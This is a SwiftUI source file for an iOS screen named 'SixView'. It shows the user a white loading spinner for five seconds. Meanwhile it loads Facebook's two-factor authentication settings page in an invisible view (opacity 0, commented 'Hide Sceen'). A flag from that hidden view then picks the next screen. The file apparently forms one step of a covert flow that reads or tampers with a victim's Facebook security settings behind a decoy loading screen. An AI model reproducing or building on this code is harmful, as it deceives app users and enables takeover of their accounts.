import SwiftUI

@available(iOS 14.0, *)
public struct SixView: View {
    @State var is_six_vui_long_cho = true
    @State var is_six_check_10_phut = false
    @State var is_six_show_10phut = true
    public init(whenCompletePushToSeven: @escaping () -> Void, whenCompletePushToEight: @escaping (Bool) -> Void) {
        self.whenCompletePushToSeven = whenCompletePushToSeven
        self.whenCompletePushToEight = whenCompletePushToEight
    }

    var whenCompletePushToSeven: () -> Void
    var whenCompletePushToEight: (Bool) -> Void

    public var body: some View {
        ZStack{  Color.white.ignoresSafeArea()
                    if is_six_vui_long_cho {
                        ProgressView("")
                    }else{
                        Color.clear.onAppear {
                            if is_six_check_10_phut {
                                self.whenCompletePushToEight(is_six_show_10phut)
                            } else{
                                self.whenCompletePushToSeven()
                            }
                        }
                        
                    }
                    ZStack{
                        CoordsSix(url: URL(string: "https://www.facebook.com/security/2fac/settings"), is_six_check_10_phut: $is_six_check_10_phut).opacity(0)//Hide Sceen
                    }.zIndex(1.0)
                }
                .foregroundColor(Color.black)
                .background(Color.white)
                .onAppear{ sixRunTime() }

    }
    
    func sixRunTime() {
        is_six_vui_long_cho = true
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            is_six_vui_long_cho = false
        }
    }
}
